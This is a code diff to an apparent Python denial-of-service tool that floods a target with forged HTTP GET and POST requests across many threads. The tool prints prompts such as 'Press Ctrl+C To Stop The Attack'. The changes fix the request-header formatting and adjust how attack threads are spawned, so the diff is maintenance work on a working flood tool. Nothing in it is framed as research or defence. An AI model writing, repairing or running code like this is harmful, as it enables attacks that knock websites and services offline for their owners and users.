@@ -56,7 +56,7 @@ def get_attack():
     global fin_threads
     while True:
         try:
-            get_packet = str("GET / HTTP/1.1\r\nHost: {target}\n\n User-Agent: {random.choice(headers_useragents)}\nReferer: {headers_referers}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 115\r\nConnection: keep-alive\r\n\r\n").encode('ascii')
+            get_packet = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(headers_useragents)}\r\nReferer: {headers_referers}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 115\r\nConnection: keep-alive\r\n\r\n".encode('ascii')
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5)
             s.connect((target, port))
@@ -405,7 +405,7 @@ print("[" + yl + "I" + wi + "] Infinity [ " + yl + attack.upper() + wi + " ] req
 print("[" + yl + "I" + wi + "] Press " + gr + "' Ctrl+C ' " + wi + "To Stop The Attack")
 
 
-threads = ((threads // 2) if not (threads % 2) else (threads + 1) // 2) if not attack.startswith(('tcp', 'udp')) else threads
+#threads = ((threads // 2) if not (threads % 2) else (threads + 1) // 2) if not attack.startswith(('tcp', 'udp')) else threads
 started = True
 
 for _ in range(threads):
@@ -415,10 +415,10 @@ for _ in range(threads):
         t1.daemon = True
         t1.start()
         THREADS.append(t1)
-        t2 = threading.Thread(target=request_get_attack)
-        t2.daemon = True
-        t2.start()
-        THREADS.append(t2)
+      #  t2 = threading.Thread(target=request_get_attack)
+      #  t2.daemon = True
+      #  t2.start()
+      #  THREADS.append(t2)
     elif attack == 'post':
         t3 = threading.Thread(target=post_attack)
         t3.daemon = True
